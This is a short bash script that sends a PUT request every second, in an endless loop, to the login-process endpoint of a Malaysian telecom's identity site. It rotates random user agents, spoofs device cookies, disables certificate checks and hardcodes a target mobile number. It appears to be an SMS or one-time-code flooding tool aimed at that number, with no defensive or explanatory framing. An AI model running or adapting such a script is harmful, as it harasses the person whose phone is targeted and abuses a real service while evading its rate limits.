#!/bin/bash
while true; do
    # for MacOS
    #postdata="next=%2F&username=bien&password=somepass&remember_me=on&submit="
    ua=$(sort --random-sort ualist | head -n 1)
    postdata="{\"actionType\":\"com.uxpsystems.mint.framework.bpm.process.ManualInputStepAction\",\"processId\":\"4159dd8f-dee6-46dd-a0be-20d7de86795b\",\"parameters\":{\"mobile\":\"60179151575\"}}"
    
    didA="AaZHN2BBBBBBjAY3fLSqDLPwaTwCq6aI"
    didB="AS5q4jNm2lKg4SXCyJRF0AQ8vTwCq6aI"
    cookie_1="_imp_apg_r_=%7B%22diA%22%3A%22$didA%22%2C%22diB%22%3A%22$didB%22%7D"

    curl -k -i 'https://id.maxis.com.my/rest/v60/process/step' -X PUT \
    -H "User-Agent: $ua" \
    -H 'Accept: application/json, text/plain, */*' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    -H 'Accept-Language: en-US,en;q=0.5' \
    -H 'Cache-Control: no-cache' \
    -H 'Connection: keep-alive' \
    -H 'Content-Length: 169' \
    -H 'Content-Type: application/json' \
    -H 'Origin: https://id.maxis.com.my' \
    -H 'Pragma: no-cache' \
    -H 'Referer: https://id.maxis.com.my/login' \
    --cookie $cookie_1 \
    --data-raw $postdata
sleep 1
done
